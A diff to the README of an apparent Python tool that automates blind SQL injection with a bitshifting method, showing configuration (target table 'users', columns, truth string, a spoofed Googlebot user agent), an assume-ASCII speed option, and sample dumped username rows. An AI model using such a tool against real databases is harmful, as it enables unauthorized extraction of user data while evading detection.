@@ -1,17 +1,9 @@
 # Blind SQL Injection via Bitshifting
 
-This is a module that performs blind SQL injection by using the bitshifting method to **calculate** chars instead of guessing them. It requires exactly 8 requests per character.
-
-Further efficiency is possible as specified in the original [paper](https://www.exploit-db.com/papers/17073/):
-
-```
-Further optimizing this technique can be done.
-The ASCII table is just 127 characters which is 7 bits per character so we can assume we will never go over it and decrement this technique with 1 request per character.
-```
-
-This module does not make those assumptions, but can with some slight modifications. This is so that it can handle all scenarios, including edge cases.
+This is a module that performs blind SQL injection by using the bitshifting method to **calculate** characters instead of guessing them. It requires 7/8 requests per character, depending on the configuration. That's a `12.5%` reduction in requests. Testing locally, this yeilded a speed increase of `15%`.
 
 ## Usage
+
 ```
 import blind-sql-bitshifting as x
 
@@ -38,16 +30,22 @@ x.options["follow_redirections"] = 0
 x.options["user_agent"] = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
 
 # Specify table to dump
-x.options["table_name"] = "table"
+x.options["table_name"] = "users"
 
 # Specify columns to dump
-x.options["columns"] = "col1,col2"
+x.options["columns"] = "id, username"
 
 # String to check for on page after successful statement
-x.options["truth_string"] = "<p id='header'>true</p>"
+x.options["truth_string"] = "<p id='success'>true</p>"
 ```
 
-Then:
+There's another boolean option that you can specify to make dumping faster:
+
+`x.options["assume_only_ascii"] = 1`
+
+This option makes the module assume that the characters it's dumping are all ASCII. Since the ASCII charset only goes up to `127`, we can set the first bit to `0` and not worry about calculating it. Of course this can cause issues when dumping chars that are outside of the ASCII range. By default, it's set to `0`.
+
+Once configured, call the `exploit()` function:
 
 `x.exploit()`
 
@@ -55,7 +53,7 @@ This returns a 2-dimensional array, with each sub-array containing a single row,
 
 Example output:
 
-`[['id', 'username'], ['1', 'lol'], ['2', 'lel']]`
+`[['id', 'username'], ['1', 'eclipse'], ['2', 'dotcppfile'], ['3', 'Acey'], ['4', 'Wardy'], ['5', 'idek']]`
 
 Optionally, your scripts can then harness the [tabulate](https://pypi.python.org/pypi/tabulate) module to output the data:
 
@@ -65,8 +63,8 @@ from tabulate import tabulate
 data = x.exploit()
 
 print tabulate(data,
-               headers='firstrow', # This specifies to use the first row as the column headers.
-               tablefmt='psql') # Using the SQL output format. Other formats can be used.
+               headers='firstrow',  # This specifies to use the first row as the column headers.
+               tablefmt='psql')     # Using the SQL output format. Other formats can be used.
 ```
 
 This would output:
@@ -75,7 +73,10 @@ This would output:
 +------+------------+
 |   id | username   |
 |------+------------|
-|    1 | lol        |
-|    2 | lel        |
+|    1 | eclipse    |
+|    2 | dotcppfile |
+|    3 | Acey       |
+|    4 | Wardy      |
+|    5 | idek       |
 +------+------------+
 ```
